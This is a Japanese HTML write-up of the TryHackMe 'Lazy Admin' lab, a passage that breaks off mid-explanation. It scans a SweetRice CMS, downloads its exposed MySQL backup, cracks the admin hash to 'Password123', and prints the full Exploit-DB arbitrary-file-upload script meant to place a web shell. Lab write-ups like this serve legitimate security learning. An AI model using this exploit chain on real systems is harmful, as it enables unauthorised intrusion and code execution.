@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Lazy Admin Writeup</title>
+  <link rel="stylesheet" href="assets/writeup.css">
+</head>
+<body>
+  <div class="nav-top"><a href="index.html">&larr; All writeups</a></div>
+
+  <header class="hero">
+    <h1>Lazy Admin</h1>
+    <p>SweetRice CMS バックアップ漏洩、Web シェル、cron/sudo perl 権限昇格。</p>
+    <div class="badges">
+      <span class="badge">Platform: TryHackMe</span>
+      <span class="badge">Difficulty: Easy</span>
+      <span class="badge">Language: 日本語</span>
+      <span class="badge">Target: Linux</span>
+    </div>
+  </header>
+
+  <main>
+    <div class="notice">
+      <strong>ネタバレ注意:</strong> この writeup にはコマンド、認証情報、フラグが含まれる場合があります。
+      許可されたラボ環境での学習目的でのみご利用ください。
+    </div>
+    
+    <article class="writeup-body">
+      <p><code>nmap</code></p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ nmap 10.49.169.227 -T4 -sVC        
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-15 09:04 +0900
+Nmap scan report for 10.49.169.227
+Host is up (0.13s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
+|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
+|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.99 seconds
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ 
+</code></pre>
+<p><code>ssh</code>と<code>http</code>のポートが開いている</p>
+<p><code>--script=vuln</code></p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ nmap 10.49.169.227 --script=vuln
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-15 08:59 +0900
+Nmap scan report for 10.49.169.227
+Host is up (0.13s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+| http-enum: 
+|_  /content/: Potentially interesting folder
+
+Nmap done: 1 IP address (1 host up) scanned in 375.72 seconds
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ 
+</code></pre>
+<p><code>/content</code>という興味深いフォルダを発見</p>
+<p><code>whatweb</code>でバージョン確認</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ whatweb http://10.49.169.227/content
+http://10.49.169.227/content [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.49.169.227], RedirectLocation[http://10.49.169.227/content/], Title[301 Moved Permanently]                                                                      
+http://10.49.169.227/content/ [200 OK] Apache[2.4.18], Cookies[sweetrice], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.49.169.227], Script[text/javascript], Title[Welcome to SweetRice - Thank your for install SweetRice as your website management system.]            
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ 
+</code></pre>
+<p><code>SweetRice</code>というサービス名を得た<br>
+ウェブサイト管理システムと謳っている</p>
+<p><code>feroxbuster</code></p>
+<pre><code class="language-bash">
+</code></pre>
+<p><code>/content/as/</code>というページを発見<br>
+アクセスしてみる</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ curl http://10.49.169.227/content/as/          
+&lt;!DOCTYPE html&gt;
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
+&lt;meta content=&quot;width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=0&quot; name=&quot;viewport&quot; id=&quot;viewport&quot;/&gt;
+&lt;title&gt;Welcome to SweetRice! - Dashboard&lt;/title&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;site.css&quot;&gt;
+&lt;script type=&quot;text/javascript&quot; src=&quot;../js/SweetRice.js&quot;&gt;&lt;/script&gt;
+&lt;script type=&quot;text/javascript&quot; src=&quot;js/function.js&quot;&gt;&lt;/script&gt;
+&lt;script type=&quot;text/javascript&quot; src=&quot;js/dashboard.js&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body id=&quot;body&quot;&gt;
+&lt;div id=&quot;div_top&quot;&gt;
+&lt;div id=&quot;top_image&quot;&gt;&lt;a href=&quot;http://10.49.169.227/content/&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;http://10.49.169.227/content/images/sweetrice_icon.png&quot; alt=&quot;Lazy Admin&amp;#039;s Website&quot; id=&quot;logo&quot;&gt;&lt;/a&gt;&lt;/div&gt;
+&lt;div id=&quot;top_word&quot;&gt;
+&lt;h1&gt;Welcome to SweetRice!&lt;/h1&gt;
+&lt;/div&gt;
+&lt;div id=&quot;top_line&quot; data=&quot;&quot;&gt;......&lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;toggle_nav&quot;&gt;&lt;/div&gt;&lt;div id=&quot;div_center&quot;&gt;
+&lt;div class=&quot;sign_form&quot;&gt;
+&lt;h2&gt;Please login&lt;/h2&gt;
+        &lt;input type=&quot;hidden&quot; id=&quot;returnUrl&quot; value=&quot;/content/as/&quot;/&gt;
+        &lt;fieldset&gt;&lt;legend&gt;Account&lt;/legend&gt;
+        &lt;input type=&quot;text&quot; id=&quot;user&quot;/&gt;&lt;/fieldset&gt;
+        &lt;fieldset&gt;&lt;legend&gt;Password&lt;/legend&gt;
+        &lt;input type=&quot;password&quot; id=&quot;passwd&quot;/&gt;&lt;/fieldset&gt;
+        &lt;input type=&quot;checkbox&quot; id=&quot;rememberme&quot; value=&quot;1&quot;/&gt; Remember Me  &lt;input type=&quot;button&quot; value=&quot;Login&quot; class=&quot;input_submit&quot; /&gt; &lt;div id=&quot;signTip&quot;&gt;&lt;/div&gt;
+        &lt;div class=&quot;div_clear&quot;&gt;&lt;/div&gt;
+        &lt;div class=&quot;tr&quot;&gt;&lt;a href=&quot;./?type=password&quot;&gt;Forgot Password?&lt;/a&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;script type=&quot;text/javascript&quot;&gt;
+&lt;!--
+        _().ready(function(){
+                _('#user').bind('keydown',function(event){
+                        event = event || window.event;
+                        if(event.keyCode == 13 &amp;&amp; _('#user').val() &amp;&amp; _('#passwd').val()){
+                                dashboardSignin();
+                        }
+                });
+                _('#passwd').bind('keydown',function(event){
+                        event = event || window.event;
+                        if(event.keyCode==13 &amp;&amp; _('#user').val() &amp;&amp; _('#passwd').val()){
+                                dashboardSignin();
+                        }
+                });
+
+                _('#rememberme').bind('keydown',function(event){
+                        event = event || window.event;
+                        if(event.keyCode==13 &amp;&amp; _('#user').val() &amp;&amp; _('#passwd').val()){
+                                dashboardSignin();
+                        }
+                });
+
+                _('.input_submit').bind('click',function()  {
+                        dashboardSignin();
+                });
+        });
+
+function dashboardSignin(){
+        var user = _('#user').val();
+        var passwd = _('#passwd').val();
+        var rememberMe = _('#rememberme').attr('checked');
+        if (!user){
+                _('#user').addClass('required').run('focus');
+                return ;
+        }else{
+                _('#user').removeClass('required');
+        }
+        if (!passwd){
+                _('#passwd').addClass('required').run('focus');
+                return ;
+        }else{
+                _('#passwd').removeClass('required');
+        }
+        _('#signTip').html('&lt;img src=&quot;../images/ajax-loader.gif&quot;&gt;');
+        var query = new Object();
+        query.user = escape(user);
+        query.passwd = passwd;
+        query.rememberMe = rememberMe;
+        _.ajax({
+                'type':'POST',
+                'data':query,
+                'url':'./?type=signin',
+                'success':function(result){
+                                if (typeof(result) == 'object'){
+                                        _('#signTip').html(result['statusInfo']);
+                                        if (result['status']==1){
+                                                location.href = _('#returnUrl').val()?_('#returnUrl').val():'./';
+                                        }
+                                }
+                }
+        });
+
+}
+//--&gt;
+&lt;/script&gt;
+&lt;div id=&quot;div_foot&quot;&gt;Powered by &lt;a href=&quot;http://www.basic-cms.org&quot;&gt;SweetRice&lt;/a&gt; &amp;copy; 2026 &lt;div class=&quot;btn_bgcolor&quot;&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+&lt;!--
+        _.ready(function(){
+                _('.btn_bgcolor').css({'background-color':_.fromColor(_.getCookie('dashboad_bg') || '#555',true)}).click(function(){
+                        var color = _.randomColor( 0x88 );
+                        _.setCookie({'name':'dashboad_bg','value':color});
+                        _(document.body).animate({'background-color':color},200);
+                        _('.btn_bgcolor').animate({'background-color':_.fromColor(color,true)},200);
+                });
+        });
+//--&gt;
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;         
+</code></pre>
+<p>「Welcome to SweetRice」というタイトルとなんらかのログイン画面があらわれた</p>
+<p>searchsploitでsweetriceを検索した</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ searchsploit sweetrice      
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                            |  Path
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+SweetRice 0.5.3 - Remote File Inclusion                                                                                   | php/webapps/10246.txt
+SweetRice 0.6.7 - Multiple Vulnerabilities                                                                                | php/webapps/15413.txt
+SweetRice 1.5.1 - Arbitrary File Download                                                                                 | php/webapps/40698.py
+SweetRice 1.5.1 - Arbitrary File Upload                                                                                   | php/webapps/40716.py
+SweetRice 1.5.1 - Backup Disclosure                                                                                       | php/webapps/40718.txt
+SweetRice 1.5.1 - Cross-Site Request Forgery                                                                              | php/webapps/40692.html
+SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                                         | php/webapps/40700.html
+SweetRice &lt; 0.6.4 - 'FCKeditor' Arbitrary File Upload                                                                     | php/webapps/14184.txt
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre>
+<p>手がかりがなく迷子になってしまった</p>
+<p><code>latest.txt</code>というファイルを見つけた</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ curl http://10.49.169.227/content/inc/lastest.txt
+1.5.1                                                                             
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ 
+</code></pre>
+<p><code>1.5.1</code>はsweetriceのバージョンである可能性が高い<br>
+searchsploitでヒットしたエクスプロイトを調べる<br>
+<code>searchsploit -x 40718</code>で<code>Bachup Disclosure</code>の中身を見てみる</p>
+<pre><code class="language-bash">Title: SweetRice 1.5.1 - Backup Disclosure
+Application: SweetRice
+Versions Affected: 1.5.1
+Vendor URL: http://www.basic-cms.org/
+Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
+Discovered by: Ashiyane Digital Security Team
+Tested on: Windows 10
+Bugs: Backup Disclosure
+Date: 16-Sept-2016
+
+
+Proof of Concept :
+
+You can access to all mysql backup and download them from this directory.
+http://localhost/inc/mysql_backup
+
+and can access to website files backup from:
+http://localhost/SweetRice-transfer.zip
+/usr/share/exploitdb/exploits/php/webapps/40718.txt (END)
+</code></pre>
+<p><code>/inc/mysql_backup</code>が誰でも落とせる状態になっているらしいので探してみよう</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ curl http://10.49.169.227/content/inc/mysql_backup/
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
+&lt;html&gt;
+ &lt;head&gt;
+  &lt;title&gt;Index of /content/inc/mysql_backup&lt;/title&gt;
+ &lt;/head&gt;
+ &lt;body&gt;
+&lt;h1&gt;Index of /content/inc/mysql_backup&lt;/h1&gt;
+  &lt;table&gt;
+   &lt;tr&gt;&lt;th valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/blank.gif&quot; alt=&quot;[ICO]&quot;&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=N;O=D&quot;&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=M;O=A&quot;&gt;Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=S;O=A&quot;&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=D;O=A&quot;&gt;Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;
+   &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/back.gif&quot; alt=&quot;[PARENTDIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;/content/inc/&quot;&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/unknown.gif&quot; alt=&quot;[   ]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;mysql_bakup_20191129023059-1.5.1.sql&quot;&gt;mysql_bakup_20191129023059-1.5.1.sql&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2019-11-29 12:30  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;4.7K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+   &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;/table&gt;
+&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at 10.49.169.227 Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+<p><code>mysql_bakup_20191129023059-1.5.1.sql</code>というバックファイルであろうファイルを見つけた<br>
+<code>curl -O</code>でこれをダウンロードする</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ curl http://10.49.169.227/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql -O
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+100   4809 100   4809   0      0  18337      0  
+</code></pre>
+<p>中身を見てみると</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/lazyAdmin]
+└─$ cat mysql_bakup_20191129023059-1.5.1.sql 
+&lt;?php return array (
+  0 =&gt; 'DROP TABLE IF EXISTS `%--%_attachment`;',
+  1 =&gt; 'CREATE TABLE `%--%_attachment` (
+  `id` int(10) NOT NULL AUTO_INCREMENT,
+  `post_id` int(10) NOT NULL,
+  `file_name` varchar(255) NOT NULL,
+  `date` int(10) NOT NULL,
+  `downloads` int(10) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
+  2 =&gt; 'DROP TABLE IF EXISTS `%--%_category`;',
+  3 =&gt; 'CREATE TABLE `%--%_category` (
+  `id` int(4) NOT NULL AUTO_INCREMENT,
+  `name` varchar(255) NOT NULL,
+  `link` varchar(128) NOT NULL,
+  `title` text NOT NULL,
+  `description` varchar(255) NOT NULL,
+  `keyword` varchar(255) NOT NULL,
+  `sort_word` text NOT NULL,
+  `parent_id` int(10) NOT NULL DEFAULT \'0\',
+  `template` varchar(60) NOT NULL,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `link` (`link`)
+) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
+  4 =&gt; 'DROP TABLE IF EXISTS `%--%_comment`;',
+  5 =&gt; 'CREATE TABLE `%--%_comment` (
+  `id` int(10) NOT NULL AUTO_INCREMENT,
+  `name` varchar(60) NOT NULL DEFAULT \'\',
+  `email` varchar(255) NOT NULL DEFAULT \'\',
+  `website` varchar(255) NOT NULL,
+  `info` text NOT NULL,
+  `post_id` int(10) NOT NULL DEFAULT \'0\',
+  `post_name` varchar(255) NOT NULL,
+  `post_cat` varchar(128) NOT NULL,
+  `post_slug` varchar(128) NOT NULL,
+  `date` int(10) NOT NULL DEFAULT \'0\',
+  `ip` varchar(39) NOT NULL DEFAULT \'\',
+  `reply_date` int(10) NOT NULL DEFAULT \'0\',
+  PRIMARY KEY (`id`)
+) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
+  6 =&gt; 'DROP TABLE IF EXISTS `%--%_item_data`;',
+  7 =&gt; 'CREATE TABLE `%--%_item_data` (
+  `id` int(10) NOT NULL AUTO_INCREMENT,
+  `item_id` int(10) NOT NULL,
+  `item_type` varchar(255) NOT NULL,
+  `data_type` varchar(20) NOT NULL,
+  `name` varchar(255) NOT NULL,
+  `value` text NOT NULL,
+  PRIMARY KEY (`id`),
+  KEY `item_id` (`item_id`),
+  KEY `item_type` (`item_type`),
+  KEY `name` (`name`)
+) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
+  8 =&gt; 'DROP TABLE IF EXISTS `%--%_item_plugin`;',
+  9 =&gt; 'CREATE TABLE `%--%_item_plugin` (
+  `id` int(10) NOT NULL AUTO_INCREMENT,
+  `item_id` int(10) NOT NULL,
+  `item_type` varchar(255) NOT NULL,
+  `plugin` varchar(255) NOT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
+  10 =&gt; 'DROP TABLE IF EXISTS `%--%_links`;',
+  11 =&gt; 'CREATE TABLE `%--%_links` (
+  `lid` int(10) NOT NULL AUTO_INCREMENT,
+  `request` text NOT NULL,
+  `url` text NOT NULL,
+  `plugin` varchar(255) NOT NULL,
+  PRIMARY KEY (`lid`)
+) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
+  12 =&gt; 'DROP TABLE IF EXISTS `%--%_options`;',
+  13 =&gt; 'CREATE TABLE `%--%_options` (
+  `id` int(10) NOT NULL AUTO_INCREMENT,
+  `name` varchar(255) NOT NULL,
+  `content` mediumtext NOT NULL,
+  `date` int(10) NOT NULL,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `name` (`name`)
+) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;',
+  14 =&gt; 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\&quot;name\\&quot;;s:25:\\&quot;Lazy Admin&amp;#039;s Website\\&quot;;s:6:\\&quot;author\\&quot;;s:10:\\&quot;Lazy Admin\\&quot;;s:5:\\&quot;title\\&quot;;s:0:\\&quot;\\&quot;;s:8:\\&quot;keywords\\&quot;;s:8:\\&quot;Keywords\\&quot;;s:11:\\&quot;description\\&quot;;s:11:\\&quot;Description\\&quot;;s:5:\\&quot;admin\\&quot;;s:7:\\&quot;manager\\&quot;;s:6:\\&quot;passwd\\&quot;;s:32:\\&quot;42f749ade7f9e195bf475f37a44cafcb\\&quot;;s:5:\\&quot;close\\&quot;;i:1;s:9:\\&quot;close_tip\\&quot;;s:454:\\&quot;&lt;p&gt;Welcome to SweetRice - Thank your for install SweetRice as your website management system.&lt;/p&gt;&lt;h1&gt;This site is building now , please come late.&lt;/h1&gt;&lt;p&gt;If you are the webmaster,please go to Dashboard -&gt; General -&gt; Website setting &lt;/p&gt;&lt;p&gt;and uncheck the checkbox \\&quot;Site close\\&quot; to open your website.&lt;/p&gt;&lt;p&gt;More help at &lt;a href=\\&quot;http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\&quot;&gt;Tip for Basic CMS SweetRice installed&lt;/a&gt;&lt;/p&gt;\\&quot;;s:5:\\&quot;cache\\&quot;;i:0;s:13:\\&quot;cache_expired\\&quot;;i:0;s:10:\\&quot;user_track\\&quot;;i:0;s:11:\\&quot;url_rewrite\\&quot;;i:0;s:4:\\&quot;logo\\&quot;;s:0:\\&quot;\\&quot;;s:5:\\&quot;theme\\&quot;;s:0:\\&quot;\\&quot;;s:4:\\&quot;lang\\&quot;;s:9:\\&quot;en-us.php\\&quot;;s:11:\\&quot;admin_email\\&quot;;N;}\',\'1575023409\');',
+  15 =&gt; 'INSERT INTO `%--%_options` VALUES(\'2\',\'categories\',\'\',\'1575023409\');',
+  16 =&gt; 'INSERT INTO `%--%_options` VALUES(\'3\',\'links\',\'\',\'1575023409\');',
+  17 =&gt; 'DROP TABLE IF EXISTS `%--%_posts`;',
+  18 =&gt; 'CREATE TABLE `%--%_posts` (
+  `id` int(10) NOT NULL AUTO_INCREMENT,
+  `name` varchar(255) NOT NULL,
+  `title` varchar(255) NOT NULL,
+  `body` longtext NOT NULL,
+  `keyword` varchar(255) NOT NULL DEFAULT \'\',
+  `tags` text NOT NULL,
+  `description` varchar(255) NOT NULL DEFAULT \'\',
+  `sys_name` varchar(128) NOT NULL,
+  `date` int(10) NOT NULL DEFAULT \'0\',
+  `category` int(10) NOT NULL DEFAULT \'0\',
+  `in_blog` tinyint(1) NOT NULL,
+  `views` int(10) NOT NULL,
+  `allow_comment` tinyint(1) NOT NULL DEFAULT \'1\',
+  `template` varchar(60) NOT NULL,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `sys_name` (`sys_name`),
+  KEY `date` (`date`)
+) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
+);?&gt;                                                                                                                                                            
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/lazyAdmin]
+└─$ 
+</code></pre>
+<p>見るとこれはSQLのログヒステリーのようだ<br>
+14行目の<code>INSERT</code>の中身を調べてみる</p>
+<pre><code class="language-mysql">VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\&quot;name\\&quot;;s:25:\\&quot;Lazy Admin&amp;#039;s Website\\&quot;;s:6:\\&quot;author\\&quot;;s:10:\\&quot;Lazy Admin\\&quot;;s:5:\\&quot;title\\&quot;;s:0:\\&quot;\\&quot;;s:8:\\&quot;keywords\\&quot;;s:8:\\&quot;Keywords\\&quot;;s:11:\\&quot;description\\&quot;;s:11:\\&quot;Description\\&quot;;s:5:\\&quot;admin\\&quot;;s:7:\\&quot;manager\\&quot;;s:6:\\&quot;passwd\\&quot;;s:32:\\&quot;42f749ade7f9e195bf475f37a44cafcb\\&quot;;s:5:\\&quot;close\\&quot;;i:1;s:9:\\&quot;close_tip\\&quot;;s:454:\\&quot;&lt;p&gt;Welcome to SweetRice - Thank your for install SweetRice as your website management system.&lt;/p&gt;&lt;h1&gt;This site is building now , please come late.&lt;/h1&gt;&lt;p&gt;If you are the webmaster,please go to Dashboard -&gt; General -&gt; Website setting &lt;/p&gt;&lt;p&gt;and uncheck the checkbox \\&quot;Site close\\&quot; to open your website.&lt;/p&gt;&lt;p&gt;More help at &lt;a href=\\&quot;http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\&quot;&gt;Tip for Basic CMS SweetRice installed&lt;/a&gt;&lt;/p&gt;\\&quot;;s:5:\\&quot;cache\\&quot;;i:0;s:13:\\&quot;cache_expired\\&quot;;i:0;s:10:\\&quot;user_track\\&quot;;i:0;s:11:\\&quot;url_rewrite\\&quot;;i:0;s:4:\\&quot;logo\\&quot;;s:0:\\&quot;\\&quot;;s:5:\\&quot;theme\\&quot;;s:0:\\&quot;\\&quot;;s:4:\\&quot;lang\\&quot;;s:9:\\&quot;en-us.php\\&quot;;s:11:\\&quot;admin_email\\&quot;;N;}\',\'1575023409\')
+</code></pre>
+<p><code>"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\</code>を見つけた<br>
+crackstation.netに<code>42f749ade7f9e195bf475f37a44cafcb</code>を投げてみる<br>
+→<code>md5</code>形式の<code>Password123</code>であることがわかった</p>
+<p>ここで<code>searchsploit</code>の結果を思い出すと</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ searchsploit sweetrice      
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                            |  Path
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+SweetRice 0.5.3 - Remote File Inclusion                                                                                   | php/webapps/10246.txt
+SweetRice 0.6.7 - Multiple Vulnerabilities                                                                                | php/webapps/15413.txt
+SweetRice 1.5.1 - Arbitrary File Download                                                                                 | php/webapps/40698.py
+SweetRice 1.5.1 - Arbitrary File Upload                                                                                   | php/webapps/40716.py
+SweetRice 1.5.1 - Backup Disclosure                                                                                       | php/webapps/40718.txt
+SweetRice 1.5.1 - Cross-Site Request Forgery                                                                              | php/webapps/40692.html
+SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                                         | php/webapps/40700.html
+SweetRice &lt; 0.6.4 - 'FCKeditor' Arbitrary File Upload                                                                     | php/webapps/14184.txt
+-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre>
+<p>任意のファイルをアップロードできる脆弱性があった<br>
+ログインしたのち、これができれば嬉しい<br>
+<code>-m</code>オプションでカレントディレクトリにコピーして中身を見てみる</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/lazyAdmin]
+└─$ searchsploit -m 40716 
+  Exploit: SweetRice 1.5.1 - Arbitrary File Upload
+      URL: https://www.exploit-db.com/exploits/40716
+     Path: /usr/share/exploitdb/exploits/php/webapps/40716.py
+    Codes: N/A
+ Verified: True
+File Type: Python script, ASCII text executable
+Copied to: /home/rkametani/tryhackme/lazyAdmin/40716.py
+
+
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/lazyAdmin]
+└─$ ls
+40716.py  hash.txt  mysql_bakup_20191129023059-1.5.1.sql
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/lazyAdmin]
+└─$ cat 40716.py             
+#/usr/bin/python
+#-*- Coding: utf-8 -*-
+# Exploit Title: SweetRice 1.5.1 - Unrestricted File Upload
+# Exploit Author: Ashiyane Digital Security Team
+# Date: 03-11-2016
+# Vendor: http://www.basic-cms.org/
+# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
+# Version: 1.5.1
+# Platform: WebApp - PHP - Mysql
+
+import requests
+import os
+from requests import session
+
+if os.name == 'nt':
+    os.system('cls')
+else:
+    os.system('clear')
+    pass
+banner = '''
++-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
+|  _________                      __ __________.__                  |
+| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
+| \_____  \\ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
+| /        \\     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
+|/_______  / \/\_/  \___  &gt;\___  &gt;__| |____|_  /__|\___  &gt;___  &gt;    |
+|        \/             \/     \/            \/        \/    \/     |
+|    &gt; SweetRice 1.5.1 Unrestricted File Upload                     |
+|    &gt; Script Cod3r : Ehsan Hosseini                                |
++-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
+'''
+
+print(banner)
+
+
+# Get Host &amp; User &amp; Pass &amp; filename
+host = input(&quot;Enter The Target URL(Example : localhost.com) : &quot;)
+username = input(&quot;Enter Username : &quot;)
+password = input(&quot;Enter Password : &quot;)
+filename = input(&quot;Enter FileName (Example:.htaccess,shell.php5,index.html) : &quot;)
+file = {'upload[]': open(filename, 'rb')}
+
+payload = {
+    'user':username,
+    'passwd':password,
+    'rememberMe':''
+}
+
+
+
+with session() as r:
+    login = r.post('http://' + host + '/as/?type=signin', data=payload)
+    success = 'Login success'
+    if login.status_code == 200:
+        print(&quot;[+] Sending User&amp;Pass...&quot;)
+        if login.text.find(success) &gt; 1:
+            print(&quot;[+] Login Succssfully...&quot;)
+        else:
+            print(&quot;[-] User or Pass is incorrent...&quot;)
+            print(&quot;Good Bye...&quot;)
+            exit()
+            pass
+        pass
+    uploadfile = r.post('http://' + host + '/as/?type=media_center&amp;mode=upload', files=file)
+    if uploadfile.status_code == 200:
+        print(&quot;[+] File Uploaded...&quot;)
+        print(&quot;[+] URL : http://&quot; + host + &quot;/attachment/&quot; + filename)
+        pass                                                                                                                                                            
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/lazyAdmin]
+└─$ 
+
+</code></pre>
+<p>まずこれは</p>
+<pre><code class="language-python">host = input(&quot;Enter The Target URL(Example : localhost.com) : &quot;)
+username = input(&quot;Enter Username : &quot;)
+password = input(&quot;Enter Password : &quot;)
+filename = input(&quot;Enter FileName (Example:.htaccess,shell.php5,index.html) : &quot;)
+</code></pre>
